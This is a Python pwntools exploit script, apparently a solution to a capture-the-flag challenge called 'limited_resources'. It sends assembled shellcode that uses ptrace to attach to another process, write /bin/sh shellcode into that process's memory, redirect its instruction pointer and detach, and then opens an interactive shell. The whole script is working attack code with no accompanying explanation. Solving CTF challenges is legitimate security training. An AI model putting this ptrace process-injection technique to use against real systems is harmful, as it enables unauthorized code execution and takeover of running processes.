#!/usr/bin/env python3

from pwn import *

exe = ELF("./limited_resources_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    #r = remote("challenge.nahamcon.com", 32327)
    return r

r = conn()

def send_payload(payload):
    r.sendline("1")
    r.recvline()
    r.sendline(str(len(payload) + 1))
    r.recvline()
    r.sendline("7")
    r.recvline()
    r.sendline(payload)
    r.recvuntil("Wrote your buffer at ")
    return int(r.recvline().strip(), 16)

def execute(addr):
    r.sendline("3")
    r.recvline()
    r.sendline(hex(addr))

o = 0
def slp():
    global o
    o+=1
    return f"""
    mov r15, 0
    loop{o}:
        inc r15
        push rbx
        pop rbx
        cmp r15, 0x70000000
        jne loop{o}
    """


def main():

    r.sendline("2")
    r.recvline()
    r.recvuntil("= ")
    pid = int(r.recvline().strip())
    shellc = shellcraft.ptrace(16, pid, 0, 0)
    shellc += slp()
    # PTRACE_PEEKDATA
    shellcode = p8(0x90)*0x10 + asm(shellcraft.sh())
    i = 0
    while i < len(shellcode):
        shellc += shellcraft.ptrace(4, pid, 0x4018a3+i, u64(shellcode[i:i+8].ljust(8, p8(0))))
        i += 8
    shellc += "mov r15, 0x404180\n"
    shellc += "mov qword ptr [r15], 0x04018a3"
    shellc += shellcraft.ptrace(13, pid, 0, 0x404100)
    shellc += shellcraft.ptrace(17, pid, 0, 0)
    shellc += """
        loop_f:
            jmp loop_f
    """
    print(pid)
    addr = send_payload(asm(shellc))
    print("shellcode here ", hex(addr))
    pause()
    execute(addr)
    
    print(r.recv(4096))

    r.interactive()


if __name__ == "__main__":
    main()
